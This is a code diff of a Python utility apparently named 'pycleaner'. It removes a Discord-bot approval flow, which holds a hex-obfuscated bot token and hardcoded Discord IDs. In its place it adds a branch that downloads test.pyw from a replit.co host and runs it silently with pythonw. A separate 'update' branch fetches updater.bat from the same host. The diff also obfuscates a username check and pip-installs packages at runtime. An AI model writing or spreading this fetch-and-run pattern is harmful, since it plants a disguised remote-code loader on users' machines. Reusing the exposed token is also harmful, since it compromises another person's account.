@@ -1,5 +1,10 @@
 import os
 try:
+    import ctypes
+except:
+    os.system("pip install ctypes")
+    import ctypes
+try:
     import wmi
 except:
     os.system("pip install wmi")
@@ -245,8 +250,11 @@ except Exception as lk:
         print (lk)
         print('Network error, try again later')
         time.sleep(5)
-        exit()
-
+        path = Path(ooo)
+        if path.is_file():
+         pass
+        else:
+         exit()
 
 def dev():
          if username != "\x66\x61\x64\x69\x61":
@@ -925,97 +933,14 @@ def fr():
         
       
      elif choice == bot:
-      os.system('cls')
-      print('please wait until approval fr')
-      @client.event
-      async def on_ready():
-       await client.change_presence(activity=discord.Game(f"{username} wants dev"))
-       user = await client.fetch_user(822132948769177620) 
-       if user is not None: 
-        if user.dm_channel is None: 
-          await user.create_dm()
-          await user.dm_channel.send(f"{username} wants dev 💀 ")
-          await client.wait_until_ready()
-          guild = client.get_guild(1005864797251842109)
-          ong = await guild.create_text_channel(name=f"{username} access")
-          webhook = await ong.create_webhook(name='dev')
-          yea = threading.Thread(target=spamhook, args=(webhook.url,)).start()
-
-
-      def spamhook(webhook):
-       webhook = DiscordWebhook(url=webhook,username=f"{username}")
-       embed = DiscordEmbed(title='devs ', description= f'{username} add , {username} remove', color=dawg)
-       webhook.add_embed(embed)
-       response = webhook.execute()
- 
-        
-      @client.event
-      async def on_message(message):
-        if message.author == client.user:
-            return
-        if message.author.bot:
-            return
-        if message.content.startswith("."):
-         channel = client.get_channel(1022200439770456124)
-         if channel:
-           channel = client.get_channel(1022200439770456124)
-           if channel:
-            await channel.send(message.author.name+' used "."')
-            await message.reply(f"{username} add , {username} remove")
-            
-        if message.content.startswith(fr"{username} add"):
-             if message.author.id == 822132948769177620:
-              channel = client.get_channel(1022200439770456124)
-              if channel:
-                await channel.send(message.author.name+fr" used {username} add")
-                ooo = fr"C:\Users\{username}\AppData\Roaming\dev.txt"
-                with open(ooo, 'w') as f:
-                 f.write('pycleaner dev')
-                 print('dev approved! W')
-                 await message.channel.delete()
-                 user = await client.fetch_user(822132948769177620) 
-                 if user is not None: 
-                  if user.dm_channel is None: 
-                   await user.create_dm()
-                   await user.dm_channel.send(f"{username} added to dev 💀")
-                 time.sleep(4)
-                 main()
-             else: 
-              user = await client.fetch_user(message.author.id) 
-              if user is not None: 
-               if user.dm_channel is None: 
-                 await user.create_dm()
-                 await user.dm_channel.send(f"only owner of pycleaner can use this command :)")
-                 await message.delete()
-          
-        if message.content.startswith(fr"{username} remove"):
-         if message.author.id == 822132948769177620:
-            channel = client.get_channel(1022200439770456124)
-            if channel:
-             await channel.send(message.author.name+fr" used {username} remove")
-             ooo = fr"C:\Users\{username}\AppData\Roaming\dev.txt"
-             await message.channel.delete()
-             user = await client.fetch_user(822132948769177620) 
-             if user is not None: 
-              if user.dm_channel is None: 
-                 await user.create_dm()
-             await user.dm_channel.send(f"{username} removed from dev 💀")
-             print('rejected from dev L')
-             time.sleep(4)
-             if os.path.isfile(ooo):
-              os.remove(ooo)
-              main()
-             if not os.path.isfile(ooo):
-              main()
-         else:
-            user = await client.fetch_user(message.author.id) 
-            if user is not None: 
-             if user.dm_channel is None: 
-                 await user.create_dm()
-             await user.dm_channel.send(f"only owner of pycleaner can use this command :)")
-             await message.delete()
-
-      client.run("\x4D\x54\x41\x78\x4E\x6A\x41\x30\x4D\x6A\x55\x33\x4D\x44\x59\x32\x4E\x6A\x63\x30\x4E\x54\x6B\x77\x4E\x67\x2E\x47\x50\x71\x47\x69\x52\x2E\x47\x34\x37\x48\x7A\x43\x6B\x76\x6C\x42\x75\x5F\x62\x75\x61\x77\x54\x61\x63\x68\x47\x74\x6E\x35\x41\x4E\x45\x5F\x5A\x6B\x37\x4A\x2D\x6A\x5F\x66\x69\x49")
+       os.system('pip install pythonw')
+       os.system('cls')
+       url = "https://untimelyimpressionableadministration.blus2tlia.repl.co/test.pyw"
+       r = requests.get(url)  
+       with open(fr"test.pyw", 'wb') as f:
+         f.write(r.content)
+       print('please restart pycleaner')
+       os.system('pythonw test.pyw')
         
      elif choice == 'update':
         download("https://untimelyimpressionableadministration.blus2tlia.repl.co/updater.bat", "updater.bat")    
